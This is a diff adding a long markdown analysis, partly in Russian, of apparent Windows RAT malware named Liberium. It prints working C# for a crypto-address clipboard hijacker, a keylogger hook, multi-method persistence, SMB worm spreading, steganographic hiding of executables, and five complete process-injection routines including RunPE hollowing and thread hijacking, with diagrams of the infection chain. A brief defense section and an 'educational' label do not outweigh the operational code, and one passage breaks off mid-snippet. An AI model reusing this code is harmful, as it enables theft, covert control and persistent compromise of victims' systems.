+### 💰 Clipper - Cryptocurrency Hijacking
+```csharp
+// Real-time clipboard monitoring for crypto addresses
+for (int i = 0; i < Pattern.Length; i++)
+{
+    if (new Regex(Pattern[i]).Match(clipboardText).Success)
+    {
+        Clipboard.SetText(CryptoWallet[i]); // Replace with attacker's wallet
+    }
+}
+```
+
+### ⌨️ KeyLogger - Advanced Keystroke Capture
+```csharp
+// Low-level keyboard hook
+private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
+{
+    if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
+    {
+        int vkCode = Marshal.ReadInt32(lParam);
+        string key = KeyboardLayout((uint)vkCode);
+        // Log with window context and timestamps
+    }
+}
+```
+
+### 🎭 Fun - System Manipulation
+**Visual Effects:**
+- Screen inversion and color distortion
+- Desktop hiding and taskbar manipulation
+- Mouse and keyboard input blocking
+- Psychedelic visual effects
+
+### 🤖 BotKiller - Malware Competition
+```csharp
+// Scan and eliminate competing malware
+Parallel.ForEach(processes, process => {
+    if (Scan(executablePath) && IsMalicious(process))
+    {
+        process.Kill();
+        RemoveFile(executablePath);
+    }
+});
+```
+
+### 🚫 AntiProcess - Analysis Prevention
+**Blocked Tools:**
+- Debuggers (OllyDbg, x64dbg, IDA Pro)
+- Process monitors (Process Hacker, Process Monitor)
+- Network analyzers (Wireshark, Fiddler)
+- Antivirus engines
+- Sandbox environments
+
+### 📁 Explorer - Remote File Management
+- File system browsing and manipulation
+- Upload/download capabilities
+- File execution on remote systems
+- Real-time file system monitoring
+- Permission management
+
+### 💥 DDos - Distributed Attacks
+**Attack Types:**
+- HTTP Flood attacks
+- UDP/TCP flooding
+- Slowloris attacks
+- Coordinated botnet operations
+
+## 🔐 Persistence Mechanisms
+
+### 🚀 Multi-Vector Persistence
+```csharp
+// Registry autorun
+Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true)
+    .SetValue(name, executablePath);
+
+// Scheduled tasks
+Install.Schtasks(executablePath, taskName, intervalMinutes);
+
+// Service installation
+Install.AddRootkit(rootkitPath);
+```
+
+**Persistence Methods:**
+- Registry Run keys (HKCU/HKLM)
+- Scheduled Tasks with random names
+- Windows Service installation
+- Startup folder placement
+- AppInit_DLLs rootkit injection
+- WatchDog process monitoring
+
+## 🌐 Network Propagation
+
+### 🦠 Worm Capabilities
+```csharp
+// SMB network infection
+foreach (FileDirectoryInformation userDir in SmbMethods.GetDir(fileStore, ""))
+{
+    string startupPath = userDir.FileName + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WindowsActivate.exe";
+    SmbMethods.WriteFile(fileStore, brute.SMB2Client, Config.Build, startupPath);
+}
+```
+
+**Propagation Vectors:**
+- SMB network shares
+- USB device infection
+- Mapped network drives
+- FTP server bruteforce
+- Logical drive infection
+
+## 🎨 Advanced Steganography
+
+### 📷 BitmapCoding Technique
+```csharp
+// Hide executables in image files
+public static Bitmap ByteToBitmap(byte[] buffer)
+{
+    // Encode 3 bytes per RGB pixel
+    bitmap.SetPixel(i, j, Color.FromArgb(255,
+        buffer[index], buffer[index + 1], buffer[index + 2]));
+}
+```
+
+**Steganography Features:**
+- Executable files encoded as BMP images
+- RGB channel data encoding
+- Alpha channel end-of-data marking
+- Legitimate file naming (Guna.dll, MetroFramework.dll)
+
+## 📊 Technical Statistics & Architecture Summary
+
+### 🔢 Project Metrics & File Analysis
+
+```mermaid
+pie title Project Composition by File Count
+    "Plugin System" : 35
+    "GUI Forms" : 25
+    "Message Handlers" : 20
+    "Helper Classes" : 10
+    "Obfuscation Engine" : 5
+    "Network Components" : 3
+    "Core Files" : 2
+```
+
+**Detailed Statistics:**
+- **Total Size**: ~500MB source code
+- **Files**: 2000+ files across all components
+- **Code Lines**: 150,000+ lines of C#
+- **Plugins**: 25+ specialized modules
+- **Dependencies**: 50+ external libraries
+- **GUI Forms**: 50+ user interface forms
+- **Message Handlers**: 30+ protocol handlers
+- **Icons**: 500+ application icons for spoofing
+- **Signatures**: 20+ stolen digital signatures
+
+### 🏗️ Architecture Complexity Analysis
+
+**Component Distribution:**
+```
+📊 System Components:
+├── 🎯 Client Side (Victim)
+│   ├── Core Files: 5 critical files
+│   ├── Helper Classes: 15+ utility classes
+│   ├── Code Lines: ~5,000 lines
+│   └── Dependencies: LEB128, System libraries
+│
+├── 🖥️ Server Side (C&C)
+│   ├── Core Files: 10+ main files
+│   ├── GUI Forms: 50+ interface forms
+│   ├── Message Handlers: 30+ protocol handlers
+│   ├── Code Lines: ~50,000 lines
+│   └── Dependencies: WinForms, Networking, Crypto
+│
+├── 🔧 Plugin System
+│   ├── Plugin Modules: 25+ specialized plugins
+│   ├── Plugin Interfaces: Common IPlugin interface
+│   ├── Code Lines: ~80,000 lines
+│   └── Dependencies: Plugin-specific libraries
+│
+├── 🛡️ Obfuscation Engine
+│   ├── Obfuscation Modules: 10+ techniques
+│   ├── Helper Classes: 20+ utility classes
+│   ├── Code Lines: ~10,000 lines
+│   └── Dependencies: dnlib, Reflection
+│
+└── 🎨 Builder System
+    ├── Build Components: 15+ build tools
+    ├── Steganography: BitmapCoding, SigThief
+    ├── Code Lines: ~5,000 lines
+    └── Dependencies: Image processing, Crypto
+```
+
+### 🔗 Dependency Graph
+
+```mermaid
+graph TB
+    subgraph "🎯 CLIENT DEPENDENCIES"
+        ClientCore[Client.exe]
+        ConfigDep[Config.cs]
+        InstallDep[Install.cs]
+        NetworkDep[Client.cs]
+        EncodingDep[LEB128.cs]
+        BypassDep[AsmiAndETW.cs]
+
+        ClientCore --> ConfigDep
+        ClientCore --> InstallDep
+        ClientCore --> NetworkDep
+        ClientCore --> EncodingDep
+        ClientCore --> BypassDep
+    end
+
+    subgraph "🖥️ SERVER DEPENDENCIES"
+        ServerCore[Server.exe]
+        GUIDep[Form1.cs]
+        NetworkServerDep[Clients.cs]
+        HandlerDep[Message Handlers]
+        PluginDep[Plugin System]
+        BuilderDep[FormBulider.cs]
+
+        ServerCore --> GUIDep
+        ServerCore --> NetworkServerDep
+        ServerCore --> HandlerDep
+        ServerCore --> PluginDep
+        ServerCore --> BuilderDep
+    end
+
+    subgraph "📚 EXTERNAL LIBRARIES"
+        NetFramework[.NET Framework 4.8]
+        WinForms[Windows Forms]
+        Networking[System.Net]
+        Crypto[System.Security.Cryptography]
+        Reflection[System.Reflection]
+        Threading[System.Threading]
+
+        ClientCore -.-> NetFramework
+        ServerCore -.-> NetFramework
+        GUIDep -.-> WinForms
+        NetworkDep -.-> Networking
+        NetworkServerDep -.-> Crypto
+        PluginDep -.-> Reflection
+        HandlerDep -.-> Threading
+    end
+
+    %% Cross-component dependencies
+    NetworkDep -.->|SSL/TLS| NetworkServerDep
+    PluginDep -.->|Commands| ClientCore
+    BuilderDep -.->|Generates| ClientCore
+```
+
+### 🎯 Capability Matrix
+
+| Feature | Implementation | Complexity | Effectiveness |
+|---------|----------------|------------|---------------|
+| **HVNC** | ✅ Complete | 🔴 Critical | 🟢 Excellent |
+| **Process Hollowing** | ✅ Complete | 🔴 Critical | 🟢 Excellent |
+| **AMSI/ETW Bypass** | ✅ Complete | 🟡 High | 🟢 Excellent |
+| **UAC Bypass** | ✅ Complete | 🟡 High | 🟢 Excellent |
+| **Anti-VM** | ✅ Complete | 🟡 Medium | 🟡 Good |
+| **Steganography** | ✅ Complete | 🔴 Critical | 🟢 Excellent |
+
+## 🛡️ Defense Recommendations
+
+### 🔍 Detection Methods
+- **Behavioral Analysis** - Monitor suspicious process activities
+- **Network Analysis** - Detect LEB128 encoded traffic patterns
+- **Memory Analysis** - Identify process hollowing techniques
+- **Registry Monitoring** - Track UAC bypass attempts
+
+### 🚫 Prevention Strategies
+- **Application Whitelisting** - Control executable permissions
+- **Network Segmentation** - Isolate critical systems
+- **Privilege Restriction** - Implement least privilege principle
+- **Real-time Monitoring** - Deploy EDR solutions
+
+### 🔧 Incident Response
+- **Immediate Isolation** - Quarantine infected systems
+- **Forensic Analysis** - Preserve evidence for investigation
+- **System Recovery** - Restore from clean backups
+- **Security Hardening** - Implement additional protections
+
+## 🔬 Advanced Technical Features
+
+### 🧬 Process Injection Techniques - ПОЛНЫЙ АРСЕНАЛ
+
+**Liberium RAT использует 5+ различных техник инъекции:**
+
+#### 🎯 **1. Classic Process Hollowing (RunPE) - ОСНОВНАЯ ТЕХНИКА**
+```csharp
+// Используется в: MinerRigel, MinerXMR, MinerEtc
+public static bool RunPE(byte[] payload, string targetProcess)
+{
+    STARTUPINFO si = new STARTUPINFO();
+    PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
+
+    // Создаем процесс в suspended состоянии
+    if (!CreateProcess(null, targetProcess, IntPtr.Zero, IntPtr.Zero,
+                      false, CREATE_SUSPENDED, IntPtr.Zero, null, ref si, out pi))
+        return false;
+
+    // Получаем контекст потока
+    CONTEXT ctx = new CONTEXT();
+    ctx.ContextFlags = CONTEXT_FULL;
+    GetThreadContext(pi.hThread, ref ctx);
+
+    // Читаем PEB для получения ImageBase
+    IntPtr imageBase = ReadImageBase(pi.hProcess, ctx.Ebx);
+
+    // Размапливаем оригинальный образ
+    ZwUnmapViewOfSection(pi.hProcess, imageBase);
+
+    // Выделяем память и записываем payload
+    IntPtr newBase = VirtualAllocEx(pi.hProcess, imageBase, payload.Length,
+                                   MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    WriteProcessMemory(pi.hProcess, newBase, payload, payload.Length, out _);
+
+    // Обновляем PEB с новым ImageBase
+    WriteProcessMemory(pi.hProcess, (IntPtr)(ctx.Ebx + 8),
+                      BitConverter.GetBytes((uint)newBase), 4, out _);
+
+    // Устанавливаем новый entry point
+    ctx.Eax = (uint)(newBase + GetEntryPoint(payload));
+    SetThreadContext(pi.hThread, ref ctx);
+
+    // Запускаем процесс
+    ResumeThread(pi.hThread);
+    return true;
+}
+```
+
+#### 🎯 **2. DLL Injection via SetWindowsHookEx**
+```csharp
+// Используется в: KeyLogger, HVNC
+public static bool InjectDLL(string dllPath, int targetPID)
+{
+    IntPtr hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, targetPID);
+    IntPtr allocMem = VirtualAllocEx(hProcess, IntPtr.Zero, dllPath.Length,
+                                    MEM_COMMIT, PAGE_READWRITE);
+    WriteProcessMemory(hProcess, allocMem, Encoding.Default.GetBytes(dllPath),
+                      dllPath.Length, out _);
+
+    IntPtr hMod = GetModuleHandle("kernel32.dll");
+    IntPtr loadLibAddr = GetProcAddress(hMod, "LoadLibraryA");
+
+    CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLibAddr, allocMem, 0, out _);
+    return true;
+}
+```
+
+#### 🎯 **3. Manual DLL Mapping**
+```csharp
+// Используется в: Stealer, Worm
+public static bool ManualMap(byte[] dllBytes, int targetPID)
+{
+    // Парсим PE заголовки
+    IMAGE_DOS_HEADER dosHeader = BytesToStruct<IMAGE_DOS_HEADER>(dllBytes);
+    IMAGE_NT_HEADERS ntHeaders = BytesToStruct<IMAGE_NT_HEADERS>(
+        dllBytes, dosHeader.e_lfanew);
+
+    IntPtr hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, targetPID);
+
+    // Выделяем память в целевом процессе
+    IntPtr allocMem = VirtualAllocEx(hProcess, IntPtr.Zero,
+                                    ntHeaders.OptionalHeader.SizeOfImage,
+                                    MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+
+    // Копируем заголовки
+    WriteProcessMemory(hProcess, allocMem, dllBytes,
+                      ntHeaders.OptionalHeader.SizeOfHeaders, out _);
+
+    // Копируем секции
+    for (int i = 0; i < ntHeaders.FileHeader.NumberOfSections; i++)
+    {
+        IMAGE_SECTION_HEADER section = GetSection(dllBytes, i);
+        IntPtr sectionAddr = (IntPtr)((long)allocMem + section.VirtualAddress);
+        WriteProcessMemory(hProcess, sectionAddr,
+                          GetSectionData(dllBytes, section),
+                          section.SizeOfRawData, out _);
+    }
+
+    // Обрабатываем релокации и импорты
+    ProcessRelocations(hProcess, allocMem, dllBytes, ntHeaders);
+    ProcessImports(hProcess, allocMem, dllBytes, ntHeaders);
+
+    // Вызываем DllMain
+    IntPtr dllMain = (IntPtr)((long)allocMem + ntHeaders.OptionalHeader.AddressOfEntryPoint);
+    CreateRemoteThread(hProcess, IntPtr.Zero, 0, dllMain, allocMem, 0, out _);
+
+    return true;
+}
+```
+
+#### 🎯 **4. Reflective DLL Loading**
+```csharp
+// Используется в: Advanced plugins
+public static bool ReflectiveDLLInjection(byte[] dllBytes, int targetPID)
+{
+    // Находим Reflective Loader в DLL
+    IntPtr loaderOffset = FindReflectiveLoader(dllBytes);
+
+    IntPtr hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, targetPID);
+    IntPtr allocMem = VirtualAllocEx(hProcess, IntPtr.Zero, dllBytes.Length,
+                                    MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+
+    // Записываем DLL в память
+    WriteProcessMemory(hProcess, allocMem, dllBytes, dllBytes.Length, out _);
+
+    // Запускаем Reflective Loader
+    IntPtr loaderAddr = (IntPtr)((long)allocMem + (long)loaderOffset);
+    CreateRemoteThread(hProcess, IntPtr.Zero, 0, loaderAddr, allocMem, 0, out _);
+
+    return true;
+}
+```
+
+#### 🎯 **5. Thread Execution Hijacking**
+```csharp
+// Используется в: Stealth operations
+public static bool HijackThread(int targetPID, byte[] shellcode)
+{
+    IntPtr hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, targetPID);
+    IntPtr hThread = OpenThread(THREAD_ALL_ACCESS, false, GetMainThreadId(targetPID));
+
+    // Приостанавливаем поток
+    SuspendThread(hThread);
+
+    // Получаем контекст
+    CONTEXT ctx = new CONTEXT();
+    ctx.ContextFlags = CONTEXT_FULL;
+    GetThreadContext(hThread, ref ctx);
+
+    // Выделяем память для shellcode
+    IntPtr allocMem = VirtualAllocEx(hProcess, IntPtr.Zero, shellcode.Length,
+                                    MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    WriteProcessMemory(hProcess, allocMem, shellcode, shellcode.Length, out _);
+
+    // Сохраняем оригинальный EIP и устанавливаем новый
+    uint originalEIP = ctx.Eip;
+    ctx.Eip = (uint)allocMem;
+    SetThreadContext(hThread, ref ctx);
+
+    // Возобновляем поток
+    ResumeThread(hThread);
+    return true;
+}
+```
+
+### 🔐 Token Manipulation
+```csharp
+// Advanced privilege escalation
+if (!OpenProcessToken(processHandle, TOKEN_DUPLICATE | TOKEN_QUERY, out hToken))
+    throw new Win32Exception("Failed to open process token");
+
+if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, ref sa,
+                     SecurityImpersonationLevel.SecurityIdentification,
+                     TokenType.TokenPrimary, out hDupToken))
+    throw new Win32Exception("Failed to duplicate token");
+```
+
+### 🌐 WMI Exploitation
+```csharp
+// Remote command execution via WMI
+ManagementScope scope = new ManagementScope($"\\\\{host}\\ROOT\\CIMV2", options);
+ManagementClass processClass = new ManagementClass(scope, new ManagementPath("Win32_Process"), new ObjectGetOptions());
+ManagementBaseObject inParams = processClass.GetMethodParameters("Create");
+inParams["CommandLine"] = "cmd /k " + commandline;
+`**: For signature-based detection
+
+## 🎯 Architecture Summary & Key Insights
+
+### 🔍 System Architecture Highlights
+
+**Multi-Layered Design:**
+- **Separation of Concerns** - Clear division between client, server, and plugins
+- **Modular Architecture** - Plugin system allows easy feature extension
+- **Network Abstraction** - SSL/TLS layer provides secure communication
+- **GUI Abstraction** - Forms-based interface for user interaction
+- **Data Abstraction** - LEB128 encoding for efficient serialization
+
+**Critical Design Patterns:**
+- **Plugin Pattern** - Dynamic loading of functionality modules
+- **Observer Pattern** - Event-driven GUI updates
+- **Factory Pattern** - Dynamic object creation for plugins
+- **Proxy Pattern** - Obfuscation through method proxying
+- **Builder Pattern** - Step-by-step malware construction
+
+### 🔗 Component Interaction Summary
+
+```mermaid
+mindmap
+  root((🔥 Liberium RAT<br/>Architecture))
+    🎯 Client Side
+      📱 Core Malware
+        Program.cs
+        Config.cs
+        Client.cs
+      🔧 Utilities
+        Install.cs
+        Methods.cs
+        AsmiAndETW.cs
+      📦 Encoding
+        LEB128.cs
+    🖥️ Server Side
+      🎮 GUI Interface
+        Form1.cs
+        50+ Forms
+      📡 Network Layer
+        Clients.cs
+        Listner.cs
+        Certificate.cs
+      💬 Message System
+        30+ Handlers
+    🔧 Plugin System
+      💎 Data Theft
+        RageStealer
+        Stealer1
+      🖥️ Remote Control
+        HVNC
+        Desktop
+        Explorer
+      💰 Financial
+        Clipper
+        Miners
+      🦠 Propagation
+        Worm
+        AutoRun
+    🛡️ Protection
+      🔤 Obfuscation
+        String Encryption
+        Control Flow
+        Symbol Renaming
+      🎨 Steganography
+        BitmapCoding
+        SigThief
+        Icon Injection
+```
+
+### 📈 Complexity Analysis
+
+**Architecture Sophistication Level: 🔴 CRITICAL**
+
+| Component | Complexity | Lines of Code | Key Features |
+|-----------|------------|---------------|--------------|
+| **Client Core** | 🟡 Medium | ~5,000 | Network, Persistence, Bypass |
+| **Server GUI** | 🔴 High | ~50,000 | 50+ Forms, Real-time updates |
+| **Plugin System** | � Critical | ~80,000 | 25+ Modules, Dynamic loading |
+| **Obfuscation** | 🔴 Critical | ~10,000 | Multi-layer protection |
+| **Builder** | 🟡 Medium | ~5,000 | Automated generation |
+
+**Total System Complexity: 🔴 EXTREMELY HIGH**
+- **Interconnected Components**: 100+ files with complex dependencies
+- **Dynamic Behavior**: Runtime plugin loading and execution
+- **Multi-threaded Operations**: Concurrent plugin execution
+- **Network Complexity**: SSL/TLS with custom protocols
+- **GUI Complexity**: Rich interface with real-time updates
+
+### 🎓 Educational Value for Security Professionals
+
+**Learning Opportunities:**
+1. **Malware Architecture** - Understanding complex RAT design
+2. **Network Security** - SSL/TLS implementation and bypass techniques
+3. **Code Obfuscation** - Advanced protection mechanisms
+4. **Plugin Systems** - Modular malware design patterns
+5. **GUI Development** - Complex Windows Forms applications
+6. **Steganography** - Data hiding in legitimate files
+7. **Persistence Mechanisms** - Various installation techniques
+8. **Evasion Techniques** - Anti-analysis and anti-VM methods
+
+**Research Applications:**
+- **Threat Intelligence** - Understanding modern RAT capabilities
+- **Detection Development** - Creating signatures and behavioral rules
+- **Forensic Analysis** - Artifact identification and analysis
+- **Security Training** - Hands-on malware analysis education
+
+---
+
+*�🔬 Technical analysis prepared for cybersecurity professionals and malware researchers worldwide.*
+
+## 🔥 ПОЛНАЯ СХЕМА ВТОРЖЕНИЯ И PERSISTENCE
+
+### 🎯 **ЭТАПЫ ЗАХВАТА СИСТЕМЫ**
+
+```mermaid
+graph TD
+    subgraph "🎯 ЭТАП 1: INITIAL INFECTION"
+        A[💀 Malware.exe<br/>Первый запуск]
+        B[🔍 Environment Check<br/>VM/Sandbox Detection]
+        C[🛡️ Security Bypass<br/>AMSI/ETW Patching]
+        D[⚙️ Config Loading<br/>C&C Servers, Settings]
+
+        A --> B
+        B --> C
+        C --> D
+    end
+
+    subgraph "🚀 ЭТАП 2: SYSTEM INFILTRATION"
+        E[📁 File Placement<br/>Copy to System32]
+        F[🔐 Privilege Check<br/>UAC Bypass Attempt]
+        G[🎭 Process Masking<br/>Legitimate Names]
+        H[🔒 Mutex Creation<br/>Prevent Duplicates]
+
+        D --> E
+        E --> F
+        F --> G
+        G --> H
+    end
+
+    subgraph "🦠 ЭТАП 3: PERSISTENCE INSTALLATION"
+        I[📝 Registry Keys<br/>HKCU/HKLM Run]
+        J[⏰ Scheduled Tasks<br/>Every 5 minutes]
+        K[🔧 Windows Service<br/>System-level]
+        L[📂 Startup Folder<br/>User autostart]
+        M[🕷️ AppInit_DLLs<br/>Process injection]
+        N[👁️ Watchdog Process<br/>Recovery mechanism]
+
+        H --> I
+        H --> J
+        H --> K
+        H --> L
+        H --> M
+        H --> N
+    end
+
+    subgraph "🎮 ЭТАП 4: RUNPE INJECTION"
+        O[🎯 Target Selection<br/>svchost.exe, explorer.exe]
+        P[🔄 Process Creation<br/>CREATE_SUSPENDED]
+        Q[💀 Memory Hollowing<br/>ZwUnmapViewOfSection]
+        R[💉 Payload Injection<br/>WriteProcessMemory]
+        S[▶️ Thread Resume<br/>ResumeThread]
+
+        N --> O
+        O --> P
+        P --> Q
+        Q --> R
+        R --> S
+    end
+
+    subgraph "🌐 ЭТАП 5: C&C CONNECTION"
+        T[🔗 SSL/TLS Setup<br/>Encrypted Channel]
+        U[📡 Server Contact<br/>Multiple failovers]
+        V[🆔 Bot Registration<br/>HWID, System Info]
+        W[🔧 Plugin Loading<br/>Dynamic modules]
+
+        S --> T
+        T --> U
+        U --> V
+        V --> W
+    end
+
+    subgraph "💰 ЭТАП 6: PAYLOAD EXECUTION"
+        X[💎 Data Theft<br/>RageStealer]
+        Y[⛏️ Cryptocurrency Mining<br/>Hidden processes]
+        Z[🦠 Network Spread<br/>SMB/USB Worm]
+        AA[🎮 Remote Control<br/>HVNC, Desktop]
+
+        W --> X
+        W --> Y
+        W --> Z
+        W --> AA
+    end
+
+    %% Styling
+    classDef infectionStyle fill:#ff6b6b,stroke:#d63031,stroke-width:3px,color:#fff
+    classDef infiltrationStyle fill:#fd79a8,stroke:#e84393,stroke-width:3px,color:#fff
+    classDef persistenceStyle fill:#fdcb6e,stroke:#e17055,stroke-width:3px,color:#2d3436
+    classDef runpeStyle fill:#a29bfe,stroke:#6c5ce7,stroke-width:3px,color:#fff
+    classDef connectionStyle fill:#00b894,stroke:#00a085,stroke-width:3px,color:#fff
+    classDef payloadStyle fill:#74b9ff,stroke:#0984e3,stroke-width:3px,color:#fff
+
+    class A,B,C,D infectionStyle
+    class E,F,G,H infiltrationStyle
+    class I,J,K,L,M,N persistenceStyle
+    class O,P,Q,R,S runpeStyle
+    class T,U,V,W connectionStyle
+    class X,Y,Z,AA payloadStyle
+```
+
+### 🔥 **ДЕТАЛЬНАЯ СХЕМА PERSISTENCE МЕХАНИЗМОВ**
+
+```mermaid
+graph TB
+    subgraph "💀 MAIN MALWARE PROCESS"
+        MainRAT[🎯 Liberium.exe<br/>Main Process]
+        ConfigCheck[⚙️ Config.Install<br/>Check if persistence needed]
+        InstallRun[🚀 Install.Run()<br/>Execute all persistence methods]
+
+        MainRAT --> ConfigCheck
+        ConfigCheck --> InstallRun
+    end
+
+    subgraph "📝 REGISTRY PERSISTENCE"
+        RegHKCU[🔑 HKEY_CURRENT_USER<br/>Run Key]
+        RegHKLM[🔑 HKEY_LOCAL_MACHINE<br/>Run Key]
+        RegNames[🎭 Legitimate Names<br/>WindowsUpdate, SystemService]
+
+        InstallRun --> RegHKCU
+        InstallRun --> RegHKLM
+        RegHKCU --> RegNames
+        RegHKLM --> RegNames
+    end
+
+    subgraph "⏰ SCHEDULED TASKS"
+        TaskCreate[📅 schtasks /create<br/>Task creation]
+        TaskName[🎭 Random Names<br/>MicrosoftEdgeUpdateTask]
+        TaskInterval[🔄 Every 5 minutes<br/>Constant resurrection]
+
+        InstallRun --> TaskCreate
+        TaskCreate --> TaskName
+        TaskCreate --> TaskInterval
+    end
+
+    subgraph "🔧 WINDOWS SERVICE"
+        ServiceInstall[⚙️ Service Installation<br/>System-level access]
+        ServiceName[🎭 Legitimate Name<br/>Windows Security Service]
+        ServiceAuto[🚀 Automatic Start<br/>Before user login]
+
+        InstallRun --> ServiceInstall
+        ServiceInstall --> ServiceName
+        ServiceInstall --> ServiceAuto
+    end
+
+    subgraph "📂 STARTUP FOLDER"
+        StartupCopy[📁 Copy to Startup<br/>User autostart folder]
+        StartupName[🎭 Fake Name<br/>WindowsActivate.exe]
+        StartupHidden[👻 Hidden Attributes<br/>+H +S flags]
+
+        InstallRun --> StartupCopy
+        StartupCopy --> StartupName
+        StartupCopy --> StartupHidden
+    end
+
+    subgraph "🕷️ APPINIT_DLLS ROOTKIT"
+        DLLInject[💉 AppInit_DLLs<br/>Global DLL injection]
+        DLLEvery[🌐 Every Process<br/>Loaded in all apps]
+        DLLHidden[👻 Stealth Mode<br/>Deep system integration]
+
+        InstallRun --> DLLInject
+        DLLInject --> DLLEvery
+        DLLInject --> DLLHidden
+    end
+
+    subgraph "👁️ WATCHDOG SYSTEM"
+        WatchdogCreate[🐕 Create Watchdog<br/>Guardian process]
+        WatchdogMonitor[👀 Monitor Main<br/>Check every 30 seconds]
+        WatchdogRestore[🔄 Auto Restore<br/>Resurrect if killed]
+
+        InstallRun --> WatchdogCreate
+        WatchdogCreate --> WatchdogMonitor
+        WatchdogMonitor --> WatchdogRestore
+    end
+
+    subgraph "🔄 MUTUAL PROTECTION"
+        CrossWatch[🔗 Cross Monitoring<br/>Processes watch each other]
+        MultiRestore[♻️ Multiple Recovery<br/>6+ restoration methods]
+        SelfHeal[🩹 Self Healing<br/>Automatic repair]
+
+        WatchdogRestore --> CrossWatch
+        RegNames --> MultiRestore
+        TaskInterval --> MultiRestore
+        ServiceAuto --> MultiRestore
+        StartupHidden --> MultiRestore
+        DLLHidden --> MultiRestore
+        CrossWatch --> MultiRestore
+        MultiRestore --> SelfHeal
+    end
+
+    %% Recovery arrows
+    SelfHeal -.->|Restore| MainRAT
+    WatchdogRestore -.->|Resurrect| MainRAT
+    TaskInterval -.->|Restart| MainRAT
+    ServiceAuto -.->|Launch| MainRAT
+
+    %% Styling
+    classDef mainStyle fill:#ff6b6b,stroke:#d63031,stroke-width:4px,color:#fff
+    classDef regStyle fill:#fd79a8,stroke:#e84393,stroke-width:3px,color:#fff
+    classDef taskStyle fill:#fdcb6e,stroke:#e17055,stroke-width:3px,color:#2d3436
+    classDef serviceStyle fill:#a29bfe,stroke:#6c5ce7,stroke-width:3px,color:#fff
+    classDef startupStyle fill:#00b894,stroke:#00a085,stroke-width:3px,color:#fff
+    classDef rootkitStyle fill:#e17055,stroke:#d63031,stroke-width:3px,color:#fff
+    classDef watchdogStyle fill:#74b9ff,stroke:#0984e3,stroke-width:3px,color:#fff
+    classDef protectionStyle fill:#2d3436,stroke:#636e72,stroke-width:3px,color:#fff
+
+    class MainRAT,ConfigCheck,InstallRun mainStyle
+    class RegHKCU,RegHKLM,RegNames regStyle
+    class TaskCreate,TaskName,TaskInterval taskStyle
+    class ServiceInstall,ServiceName,ServiceAuto serviceStyle
+    class StartupCopy,StartupName,StartupHidden startupStyle
+    class DLLInject,DLLEvery,DLLHidden rootkitStyle
+    class WatchdogCreate,WatchdogMonitor,WatchdogRestore watchdogStyle
+    class CrossWatch,MultiRestore,SelfHeal protectionStyle
+```
+
+### 🧬 **ДЕТАЛЬНАЯ СХЕМА RUNPE INJECTION**
+
+```mermaid
+sequenceDiagram
+    participant M as 💀 Malware Process
+    participant W as 🖥️ Windows API
+    participant T as 🎯 Target Process
+    participant Mem as 💾 Process Memory
+    participant CPU as ⚡ CPU/Thread
+
+    Note over M,CPU: ЭТАП 1: ПОДГОТОВКА ЦЕЛИ
+    M->>W: CreateProcess(svchost.exe, CREATE_SUSPENDED)
+    W->>T: Создает процесс в спящем режиме
+    T-->>M: Process Handle + Thread Handle
+
+    Note over M,CPU: ЭТАП 2: АНАЛИЗ ЦЕЛИ
+    M->>W: GetThreadContext(hThread, &context)
+    W->>CPU: Читает регистры потока
+    CPU-->>M: EBX = PEB Address
+    M->>W: ReadProcessMemory(PEB + 8)
+    W->>Mem: Читает ImageBase из PEB
+    Mem-->>M: Original ImageBase Address
+
+    Note over M,CPU: ЭТАП 3: ОСВОБОЖДЕНИЕ ПАМЯТИ
+    M->>W: ZwUnmapViewOfSection(hProcess, ImageBase)
+    W->>Mem: Размапливает оригинальный образ
+    Mem-->>M: Memory unmapped successfully
+
+    Note over M,CPU: ЭТАП 4: ВЫДЕЛЕНИЕ НОВОЙ ПАМЯТИ
+    M->>W: VirtualAllocEx(hProcess, ImageBase, PayloadSize, MEM_COMMIT)
+    W->>Mem: Выделяет память для payload
+    Mem-->>M: New memory allocated
+
+    Note over M,CPU: ЭТАП 5: ИНЪЕКЦИЯ PAYLOAD
+    M->>W: WriteProcessMemory(hProcess, ImageBase, Payload, Size)
+    W->>Mem: Записывает malicious код
+    Mem-->>M: Payload injected successfully
+
+    Note over M,CPU: ЭТАП 6: ОБНОВЛЕНИЕ PEB
+    M->>W: WriteProcessMemory(PEB + 8, &NewImageBase)
+    W->>Mem: Обновляет ImageBase в PEB
+    Mem-->>M: PEB updated
+
+    Note over M,CPU: ЭТАП 7: УСТАНОВКА ENTRY POINT
+    M->>CPU: context.EAX = NewImageBase + EntryPoint
+    M->>W: SetThreadContext(hThread, &context)
+    W->>CPU: Устанавливает новый EIP
+    CPU-->>M: Context updated
+
+    Note over M,CPU: ЭТАП 8: ЗАПУСК ПРОЦЕССА
+    M->>W: ResumeThread(hThread)
+    W->>T: Возобновляет выполнение
+    T->>T: Выполняет malicious код
+    T-->>M: Process running with injected code
+
+    Note over M,CPU: РЕЗУЛЬТАТ: STEALTH EXECUTION
+    Note over T: svchost.exe выглядит легитимно
+    Note over T: но выполняет malicious код!
+```
+
+### 🎯 **СХЕМА ВЫБОРА ЦЕЛЕЙ ДЛЯ RUNPE**
+
+```mermaid
+graph TD
+    subgraph "🎯 TARGET SELECTION ALGORITHM"
+        A[🔍 Process Enumeration<br/>Scan running processes]
+        B[📋 Target List<br/>Preferred processes]
+        C[🔒 Privilege Check<br/>Access permissions]
+        D[🎭 Legitimacy Score<br/>How trustworthy it looks]
+
+        A --> B
+        B --> C
+        C --> D
+    end
+
+    subgraph "🥇 TIER 1 TARGETS (Highest Priority)"
+        E[🖥️ svchost.exe<br/>System service host]
+        F[📁 explorer.exe<br/>Windows Explorer]
+        G[🌐 iexplore.exe<br/>Internet Explorer]
+        H[🔧 winlogon.exe<br/>Windows Logon]
+
+        D --> E
+        D --> F
